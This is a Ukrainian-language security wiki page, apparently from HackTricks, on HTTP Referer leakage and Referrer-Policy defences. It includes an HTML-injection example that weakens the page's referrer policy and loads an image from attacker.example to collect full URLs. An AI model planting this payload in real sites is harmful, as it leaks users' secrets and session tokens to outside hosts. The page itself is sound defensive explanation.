# Цікава поведінка HTTP

{{#include ../banners/hacktricks-training.md}}

## Заголовок `Referer` і політика Referrer

HTTP-заголовок запиту `Referer` визначає абсолютну або часткову URL-адресу, з якої було запитано ресурс. Залежно від активної політики referrer, він може містити origin, шлях і рядок запиту, але не фрагмент URL.<sup>[[1]](#references)</sup>

### Витік чутливої інформації

Секрети в шляхах URL або параметрах запиту можуть потрапити в історію браузера, логи, аналітичні системи, скопійовані посилання та заголовок `Referer`. Тому cross-origin посилання або запит до subresource може розкрити URL-адресу, що містить referrer, зовнішньому серверу.<sup>[[2]](#references)</sup>

### Захист

Використовуйте заголовок відповіді `Referrer-Policy`, щоб контролювати обсяг інформації про referrer, яку браузер надсилає. `strict-origin-when-cross-origin` є сучасним значенням за замовчуванням у браузерах, тоді як `no-referrer` повністю приховує цей заголовок; обирайте політику відповідно до вимог застосунку.<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
Не розміщуйте паролі, ідентифікатори сесій, API keys або інші конфіденційні значення в URL. Натомість надсилайте їх у відповідних request headers або тілах запитів через TLS.<sup>[[2]](#references)</sup>

### Міркування щодо HTML Injection

Документ також може встановити політику для всієї сторінки за допомогою `<meta name="referrer">`. Якщо вразливість HTML injection дає зловмиснику змогу вставити ефективний meta element, він може спробувати послабити політику документа для наступних запитів. Динамічно інжектовані або конфліктуючі meta policies можуть поводитися непередбачувано, тому перевіряйте поведінку в цільовому браузері, а не припускайте, що response header завжди перевизначається.<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
Виправте базову HTML-ін'єкцію та не розміщуйте конфіденційні дані в URL; referrer policy є додатковим рівнем захисту, а не заміною жодного з цих заходів.

## References

- [1] [MDN - заголовок `Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - використання методу GET із конфіденційними рядками запиту](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - заголовок `Referrer-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
